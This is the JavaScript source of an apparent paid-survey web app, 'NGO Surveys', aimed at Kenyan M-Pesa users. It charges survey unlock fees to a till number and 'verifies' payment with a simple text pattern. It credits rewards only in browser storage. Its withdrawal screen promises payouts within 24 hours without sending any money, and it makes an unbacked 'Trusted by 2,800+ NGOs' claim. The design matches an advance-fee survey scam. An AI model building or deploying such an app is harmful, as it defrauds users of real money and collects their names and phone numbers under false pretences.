import { SURVEY_SETS, SURVEY_TIERS, TIER_DETAILS } from './src/surveysData.js';

const STORE_KEY = 'ngo-surveys-v1';
const blankState = { balance: 0, totalEarned: 0, surveys: {}, withdrawals: [] };

let state = { ...blankState };
const stored = localStorage.getItem(STORE_KEY);
if (stored) {
  try { Object.assign(state, JSON.parse(stored)); } catch {}
}

let activeSurvey = null;
let paymentSurvey = null;
let withdrawOpen = false;
let toast = '';
let toastTimer = null;

let runnerIndex = 0;
let runnerChoice = null;
let runnerDone = false;

let paymentMessage = '';
let paymentError = '';

let withdrawForm = { name: '', phone: '', amount: '' };
let withdrawError = '';
let withdrawProcessing = false;
let withdrawComplete = false;

let handlersAttached = false;

function saveState() {
  localStorage.setItem(STORE_KEY, JSON.stringify(state));
}

function setToast(msg) {
  toast = msg;
  render();
  if (toastTimer) clearTimeout(toastTimer);
  toastTimer = setTimeout(() => { toast = ''; render(); }, 2600);
}

function answeredCount() {
  return Object.values(state.surveys).reduce((sum, item) => sum + (item.completedQuestions?.length || 0), 0);
}

const ICON_MAP = {
  ArrowDownToLine: 'arrow-down-to-line',
  CircleDollarSign: 'circle-dollar-sign',
  CircleCheck: 'circle-check',
  Sparkles: 'sparkles',
  WalletCards: 'wallet-cards',
  Landmark: 'landmark',
  LockKeyhole: 'lock-keyhole',
  Play: 'play',
  CheckCircle2: 'check-circle-2',
  Coins: 'coins',
  X: 'x',
  ShieldCheck: 'shield-check',
  ClipboardCheck: 'clipboard-check',
  AlertCircle: 'alert-circle',
  LoaderCircle: 'loader-circle',
  ArrowRight: 'arrow-right',
};

function icon(name, size) {
  const lucideName = ICON_MAP[name] || name.replace(/[A-Z]/g, m => '-' + m.toLowerCase()).replace(/^-/, '');
  const sizeAttrs = size ? ` width="${size}" height="${size}"` : '';
  return `<i data-lucide="${lucideName}"${sizeAttrs}></i>`;
}

function openSurvey(survey) {
  const status = state.surveys[survey.id];
  if (survey.unlockFee > 0 && !status?.unlocked) {
    paymentSurvey = survey;
  } else {
    activeSurvey = survey;
    const completed = state.surveys[survey.id]?.completedQuestions || [];
    runnerIndex = Math.max(0, survey.questions.findIndex(q => !completed.includes(q.id)));
    runnerChoice = null;
    runnerDone = false;
  }
  render();
}

function unlockSurvey(id) {
  if (!state.surveys[id]) state.surveys[id] = {};
  state.surveys[id].unlocked = true;
  state.surveys[id].completedQuestions = state.surveys[id].completedQuestions || [];
  saveState();
  paymentSurvey = null;
  setToast('Survey unlocked');
}

function answerQuestion(surveyId, questionId, reward) {
  const survey = state.surveys[surveyId] || { unlocked: true, completedQuestions: [] };
  if (survey.completedQuestions.includes(questionId)) return;
  survey.completedQuestions = [...survey.completedQuestions, questionId];
  state.surveys[surveyId] = survey;
  state.balance = +(state.balance + reward).toFixed(2);
  state.totalEarned = +(state.totalEarned + reward).toFixed(2);
  saveState();
  setToast(`+ KSh ${reward.toFixed(2)} reward earned`);
}

function withdraw(amount) {
  state.balance = +(state.balance - amount).toFixed(2);
  state.withdrawals = [...(state.withdrawals || []), { amount, at: new Date().toISOString() }];
  saveState();
}

function closeRunner() {
  activeSurvey = null;
  runnerIndex = 0;
  runnerChoice = null;
  runnerDone = false;
  render();
}

function advanceRunner() {
  const survey = activeSurvey;
  if (runnerIndex === survey.questions.length - 1) {
    closeRunner();
  } else {
    runnerIndex++;
    runnerChoice = null;
    runnerDone = false;
    render();
  }
}

function submitRunnerAnswer() {
  const survey = activeSurvey;
  const question = survey.questions[runnerIndex];
  const completed = state.surveys[survey.id]?.completedQuestions || [];
  const alreadyDone = completed.includes(question.id);

  if (alreadyDone) {
    advanceRunner();
    return;
  }

  if (runnerChoice === null) return;

  runnerDone = true;
  answerQuestion(survey.id, question.id, survey.rewardPerQuestion);
  render();
}

function verifyPayment() {
  const survey = paymentSurvey;
  const code = /\b[A-Z]{2}\d{8}\b/i.test(paymentMessage);
  const amount = new RegExp(`(?:Ksh|KES)\\s*${survey.unlockFee}(?:\\.00)?\\b`, 'i').test(paymentMessage);
  if (!code || !amount) {
    paymentError = `Enter the format with a code (e.g. QK12345678) and Ksh ${survey.unlockFee}.`;
    render();
    return;
  }
  paymentError = '';
  paymentMessage = '';
  unlockSurvey(survey.id);
  render();
}

function submitWithdraw(e) {
  e.preventDefault();
  const amount = Number(withdrawForm.amount);
  if (!withdrawForm.name.trim()) {
    withdrawError = 'Enter a name for this request.';
    render();
    return;
  }
  if (!/^(?:07|01)\d{8}$/.test(withdrawForm.phone.replace(/\s/g, ''))) {
    withdrawError = 'Use a valid Kenyan mobile format: 07XXXXXXXX or 01XXXXXXXX.';
    render();
    return;
  }
  if (amount < 500 || amount > state.balance) {
    withdrawError = `Enter an amount from KSh 500 to KSh ${state.balance.toFixed(2)}.`;
    render();
    return;
  }
  withdrawError = '';
  withdrawProcessing = true;
  render();
  setTimeout(() => {
    withdraw(amount);
    withdrawProcessing = false;
    withdrawComplete = true;
    withdrawForm = { name: '', phone: '', amount: '' };
    render();
  }, 1500);
}

function renderNavbar() {
  return `
    <header class="topbar">
      <a class="brand" href="#top">
        <span class="brand-mark"><img src="./Gemini_Generated_Image_hlqd8dhlqd8dhlqd.jfif" alt="NGO Surveys logo" /></span>
        <span>NGO <b>SURVEYS</b></span>
      </a>
      <nav class="tier-links" aria-label="Survey tiers">
        <button data-tier="free">Free</button>
        <button data-tier="premium">Premium</button>
        <button data-tier="premium_plus">Plus</button>
      </nav>
      <div class="wallet-wrap">
        <div class="wallet">
          ${icon('WalletCards', 18)}
          <span><small>Wallet balance</small><strong>KSh ${state.balance.toFixed(2)}</strong></span>
          <i>Total earned: KSh ${state.totalEarned.toFixed(2)}</i>
        </div>
        <button class="withdraw-nav" data-action="open-withdraw">
          ${icon('Landmark', 16)} <span>Withdraw</span>
        </button>
      </div>
    </header>
  `;
}

function renderHero() {
  return `
    <section class="hero">
      <div class="hero-copy">
        <div class="demo-pill">Trusted by 2,800+ NGOs</div>
        <h1>Your voice can help shape <em>impact.</em></h1>
        <p>Explore community research surveys, record your opinions, and earn rewards for sharing your perspective.</p>
        <div class="hero-actions">
          <button class="primary-button" data-action="explore-surveys">${icon('Sparkles', 18)} Explore surveys</button>
          <button class="text-button" data-action="open-withdraw">${icon('ArrowDownToLine', 17)} Request payout</button>
        </div>
      </div>
      <div class="hero-panel">
        <div class="impact-orb">${icon('CircleDollarSign', 45)}</div>
        <p>YOUR WALLET</p>
        <strong>KSh ${state.balance.toFixed(2)}</strong>
        <span>${icon('CircleCheck', 15)} ${answeredCount()} thoughtful answers recorded</span>
        <small>Available rewards</small>
      </div>
    </section>
  `;
}

function renderStats() {
  return `
    <section class="stats">
      <div><span>Survey sets</span><strong>15</strong><small>Across three research tiers</small></div>
      <div><span>Questions</span><strong>75</strong><small>Each answer is saved locally</small></div>
      <div><span>Total rewards</span><strong>KSh ${state.totalEarned.toFixed(2)}</strong><small>Earned from completed surveys</small></div>
    </section>
  `;
}

function renderSurveyCard(survey) {
  const details = TIER_DETAILS[survey.tier];
  const status = state.surveys[survey.id];
  const completed = status?.completedQuestions?.length || 0;
  const isCompleted = completed === survey.questions.length;
  const locked = survey.unlockFee > 0 && !status?.unlocked;
  let btnHtml;
  if (locked) {
    btnHtml = `<button class="card-action locked" data-action="open-survey" data-survey="${survey.id}">${icon('LockKeyhole', 16)} Unlock · KSh ${survey.unlockFee}</button>`;
  } else if (isCompleted) {
    btnHtml = `<button class="card-action" data-action="open-survey" data-survey="${survey.id}">${icon('CheckCircle2', 16)} Review</button>`;
  } else {
    btnHtml = `<button class="card-action" data-action="open-survey" data-survey="${survey.id}">${icon('Play', 16)} ${completed ? 'Continue' : 'Start survey'}</button>`;
  }
  const progressPct = (completed / survey.questions.length) * 100;
  return `
    <article class="survey-card ${details.color} ${isCompleted ? 'is-complete' : ''}">
      <div class="card-top"><span class="tier-badge ${details.color}">${details.label}</span>${isCompleted ? `<span class="completed-tag">${icon('CheckCircle2', 14)} Completed</span>` : ''}</div>
      <h3>${survey.title}</h3><p>${details.description}</p>
      <div class="reward-line">${icon('Coins', 17)}<span>KSh ${survey.rewardPerQuestion.toFixed(2)} <small>per question</small></span></div>
      <div class="card-footer"><span>${completed}/${survey.questions.length} answered</span>${btnHtml}</div>
      <div class="progress-track"><span style="width:${progressPct}%"></span></div>
    </article>
  `;
}

function renderTiers() {
  const tierOrder = [SURVEY_TIERS.FREE, SURVEY_TIERS.PREMIUM, SURVEY_TIERS.PREMIUM_PLUS];
  return tierOrder.map(tier => {
    const details = TIER_DETAILS[tier];
    const surveys = SURVEY_SETS.filter(s => s.tier === tier);
    const firstPaid = surveys.find(s => s.unlockFee > 0);
    const unlockNote = tier !== 'free' && firstPaid
      ? `<span class="unlock-note">Unlock fee: KSh ${firstPaid.unlockFee}</span>`
      : '';
    const titleMap = { free: 'Start with community insight', premium: 'Explore focused research', premium_plus: 'Contribute to global thinking' };
    return `
      <section class="tier-section" id="${tier}">
        <div class="section-heading">
          <div><span class="tier-badge ${details.color}">${details.label}</span><h2>${titleMap[tier]}</h2><p>${details.description}</p></div>
          ${unlockNote}
        </div>
        <div class="survey-grid">
          ${surveys.map(s => renderSurveyCard(s)).join('')}
        </div>
      </section>
    `;
  }).join('');
}

function renderCashout() {
  return `
    <section class="cashout-callout">
      <div><span class="eyebrow">PAYOUTS</span><h2>Withdraw your rewards.</h2><p>Once your wallet reaches KSh 500, you can request a payout to your M-Pesa number.</p></div>
      <button class="gold-button" data-action="open-withdraw"${state.balance < 500 ? ' disabled' : ''}>${state.balance < 500 ? `KSh ${(500 - state.balance).toFixed(2)} to payout threshold` : 'Request payout'} ${icon('ArrowDownToLine', 18)}</button>
    </section>
  `;
}

function renderToast() {
  if (!toast) return '';
  return `<div class="toast">${icon('CircleCheck', 18)}${toast}</div>`;
}

function renderPaymentModal() {
  if (!paymentSurvey) return '';
  const fee = paymentSurvey.unlockFee;
  return `
    <div class="modal-backdrop" role="dialog" aria-modal="true">
      <section class="modal payment-modal">
        <button class="icon-close" data-action="close-payment" aria-label="Close">${icon('X')}</button>
        <div class="modal-icon teal">${icon('ShieldCheck')}</div>
        <span class="eyebrow">SECURE PAYMENT</span>
        <h2>Unlock ${paymentSurvey.title}</h2>
        <p class="modal-copy">Complete the payment below to unlock this survey and start earning rewards.</p>
        <div class="payment-instructions">
          ${icon('ClipboardCheck', 20)}<div><strong>Payment reference</strong><p>Pay to Till 8934120 · "NGO Surveys Services"</p><code>QK12345678 Confirmed. Ksh ${fee}.00 PAID</code></div>
        </div>
        <label>Paste your confirmation message here<textarea id="payment-msg" placeholder="Example: QK12345678 Confirmed. Ksh ${fee}.00 PAID">${paymentMessage}</textarea></label>
        ${paymentError ? `<p class="form-error">${icon('AlertCircle', 15)}${paymentError}</p>` : ''}
        <button class="primary-button full" data-action="verify-payment">Verify payment & unlock</button>
      </section>
    </div>
  `;
}

function renderSurveyRunner() {
  if (!activeSurvey) return '';
  const survey = activeSurvey;
  const completedIds = state.surveys[survey.id]?.completedQuestions || [];
  const question = survey.questions[runnerIndex];
  const alreadyDone = completedIds.includes(question.id);
  return `
    <div class="modal-backdrop runner-backdrop" role="dialog" aria-modal="true">
      <section class="runner">
        <div class="runner-head">
          <div><span class="eyebrow">${survey.title}</span><h2>Question ${runnerIndex + 1} <small>of ${survey.questions.length}</small></h2></div>
          <button class="icon-close" data-action="close-runner">${icon('X')}</button>
        </div>
        <div class="runner-progress"><span style="width:${((runnerIndex + 1) / survey.questions.length) * 100}%"></span></div>
        ${runnerDone ? `
          <div class="reward-screen">
            <div class="reward-orb">${icon('Coins', 36)}</div>
            <span class="eyebrow">ANSWER SAVED</span>
            <h2>+ KSh ${survey.rewardPerQuestion.toFixed(2)}</h2>
            <p>Your wallet has been updated with your reward.</p>
            <button class="primary-button" data-action="advance-runner">${runnerIndex === survey.questions.length - 1 ? 'Finish survey' : 'Next question'} ${icon('ArrowRight', 18)}</button>
          </div>
        ` : `
          <h3 class="question-text">${question.text}</h3>
          <div class="answers">
            ${question.options.map((option, i) => `
              <button class="answer ${runnerChoice === i ? 'selected' : ''} ${alreadyDone ? 'answered' : ''}" data-option="${i}">
                <span>${String.fromCharCode(65 + i)}</span>${option}${alreadyDone ? icon('CheckCircle2', 18) : ''}
              </button>
            `).join('')}
          </div>
          <button class="primary-button submit-answer" data-action="submit-runner"${!alreadyDone && runnerChoice === null ? ' disabled' : ''}>${alreadyDone ? 'Continue' : 'Submit answer'} ${icon('ArrowRight', 18)}</button>
        `}
      </section>
    </div>
  `;
}

function renderWithdrawModal() {
  if (!withdrawOpen) return '';
  const amount = Number(withdrawForm.amount);
  return `
    <div class="modal-backdrop" role="dialog" aria-modal="true">
      <section class="modal withdraw-modal">
        <button class="icon-close" data-action="close-withdraw">${icon('X')}</button>
        ${withdrawComplete ? `
          <div class="success-state">
            <div class="modal-icon green">${icon('CheckCircle2', 47)}</div>
            <span class="eyebrow">COMPLETE</span>
            <h2>Request recorded</h2>
            <p>KSh ${amount.toFixed(2)} will be sent to ${withdrawForm.phone} within 24 hours.</p>
            <button class="primary-button" data-action="close-withdraw">Close</button>
          </div>
        ` : `
          <div class="modal-icon gold">${icon('Landmark', 36)}</div>
          <span class="eyebrow">CASH-OUT</span>
          <h2>Withdraw cash</h2>
          <p class="modal-copy">Minimum withdrawal: KSh 500. Funds are sent directly to your M-Pesa number.</p>
          <form id="withdraw-form">
            <label>Full name<input name="name" value="${withdrawForm.name}" placeholder="e.g. Amina Wanjiku" /></label>
            <label>M-Pesa phone number<input name="phone" value="${withdrawForm.phone}" placeholder="07XXXXXXXX" inputmode="numeric" /></label>
            <label>Amount (KSh)<input name="amount" value="${withdrawForm.amount}" placeholder="Available: ${state.balance.toFixed(2)}" type="number" min="500" max="${state.balance}" /></label>
            ${withdrawError ? `<p class="form-error">${icon('AlertCircle', 15)}${withdrawError}</p>` : ''}
            <button class="primary-button full" ${state.balance < 500 || withdrawProcessing ? 'disabled' : ''}>${withdrawProcessing ? `<span class="spin">${icon('LoaderCircle', 18)}</span> Processing…` : 'Confirm withdrawal'}</button>
          </form>
        `}
      </section>
    </div>
  `;
}

function renderModals() {
  return renderPaymentModal() + renderSurveyRunner() + renderWithdrawModal();
}

function render() {
  const root = document.getElementById('root');
  root.innerHTML = `
    <div class="app-shell">
      ${renderNavbar()}
      <main>
        ${renderHero()}
        ${renderStats()}
        ${renderTiers()}
        ${renderCashout()}
      </main>
      <footer>NGO SURVEYS <span>•</span> Community research that rewards your perspective</footer>
      ${renderToast()}
      ${renderModals()}
    </div>
  `;
  if (window.lucide) lucide.createIcons();
  if (!handlersAttached) attachHandlers();
}

function attachHandlers() {
  handlersAttached = true;
  const root = document.getElementById('root');

  root.addEventListener('click', function (e) {
    const target = e.target;

    const tierBtn = target.closest('button[data-tier]');
    if (tierBtn) {
      document.getElementById(tierBtn.dataset.tier)?.scrollIntoView({ behavior: 'smooth' });
      return;
    }

    const actionBtn = target.closest('[data-action]');
    if (actionBtn) {
      const action = actionBtn.dataset.action;
      switch (action) {
        case 'open-withdraw':
          withdrawOpen = true;
          withdrawComplete = false;
          withdrawForm = { name: '', phone: '', amount: '' };
          withdrawError = '';
          render();
          break;
        case 'close-withdraw':
          withdrawOpen = false;
          withdrawComplete = false;
          withdrawForm = { name: '', phone: '', amount: '' };
          render();
          break;
        case 'close-payment':
          paymentSurvey = null;
          paymentMessage = '';
          paymentError = '';
          render();
          break;
        case 'verify-payment':
          paymentMessage = document.getElementById('payment-msg')?.value || '';
          verifyPayment();
          break;
        case 'open-survey': {
          const id = actionBtn.dataset.survey;
          const survey = SURVEY_SETS.find(s => s.id === id);
          if (survey) openSurvey(survey);
          break;
        }
        case 'close-runner':
          closeRunner();
          break;
        case 'submit-runner':
          submitRunnerAnswer();
          break;
        case 'advance-runner':
          advanceRunner();
          break;
        case 'explore-surveys':
          document.getElementById('free')?.scrollIntoView({ behavior: 'smooth' });
          break;
      }
      return;
    }

    const answerBtn = target.closest('.answer');
    if (answerBtn && activeSurvey) {
      const completedIds = state.surveys[activeSurvey.id]?.completedQuestions || [];
      const alreadyDone = completedIds.includes(activeSurvey.questions[runnerIndex].id);
      if (!alreadyDone) {
        runnerChoice = parseInt(answerBtn.dataset.option);
        render();
      }
    }
  });

  root.addEventListener('input', function (e) {
    const el = e.target;
    if (el.name) {
      withdrawForm[el.name] = el.value;
    }
    if (el.id === 'payment-msg') {
      paymentMessage = el.value;
    }
  });

  root.addEventListener('submit', function (e) {
    const form = e.target.closest('form');
    if (form && form.id === 'withdraw-form') {
      submitWithdraw(e);
    }
  });
}

render();
